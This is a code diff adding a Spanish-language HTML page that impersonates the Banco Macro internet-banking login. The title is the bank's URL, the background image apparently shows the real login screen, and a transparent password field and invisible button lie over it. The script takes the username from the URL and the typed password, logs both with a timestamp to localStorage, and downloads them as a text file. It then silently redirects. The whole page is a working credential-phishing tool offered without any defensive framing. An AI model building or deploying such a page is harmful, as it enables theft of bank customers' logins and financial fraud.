@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>https://www.macro.com.ar/bancainternet/</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: url('fondo_clave.jpg') no-repeat top left;
+            background-size: 100% 100%;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+        form {
+            position: absolute;
+            top: 53%;
+            right: 8%;
+            width: 280px;
+        }
+        .campo-clave-transparente {
+            width: 100%;
+            height: 55px;
+            border: none;
+            background: transparent;
+            color: #000;
+            font-size: 16px;
+            padding: 0 10px;
+            outline: none;
+            cursor: text;
+        }
+        .boton-invisible {
+            position: absolute;
+            top: 65px;
+            left: 0;
+            width: 100%;
+            height: 40px;
+            border: none;
+            background: transparent;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <form id="formAcceso">
+        <input type="hidden" id="usuarioRecibido">
+        <input type="password" id="claveIngresada" class="campo-clave-transparente" required>
+        <button type="submit" class="boton-invisible"></button>
+    </form>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const usuario = params.get('usuario') || '';
+
+        function guardarYDescargar(usuario, clave) {
+            const fechaHora = new Date().toLocaleString('es-AR');
+            const nuevaLinea = `Fecha: ${fechaHora} | Usuario: ${usuario} | Clave: ${clave}\n`;
+
+            // Agregar al historial
+            let registros = localStorage.getItem('historialAccesos') || '';
+            registros += nuevaLinea;
+            localStorage.setItem('historialAccesos', registros);
+
+            // Descargar el archivo
+            const blob = new Blob([registros], { type: 'text/plain;charset=utf-8' });
+            const url = URL.createObjectURL(blob);
+            const enlace = document.createElement('a');
+            enlace.href = url;
+            enlace.download = 'registro_accesos.txt';
+            document.body.appendChild(enlace);
+            enlace.click();
+            document.body.removeChild(enlace);
+            URL.revokeObjectURL(url);
+
+            // Volver al inicio sin mostrar mensajes
+            window.location.href = 'index.html';
+        }
+
+        document.getElementById('formAcceso').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const clave = document.getElementById('claveIngresada').value;
+            if (!usuario || !clave) {
+                alert('Completa todos los datos');
+                return;
+            }
+            guardarYDescargar(usuario, clave);
+        });
+    </script>
+</body>
+</html>
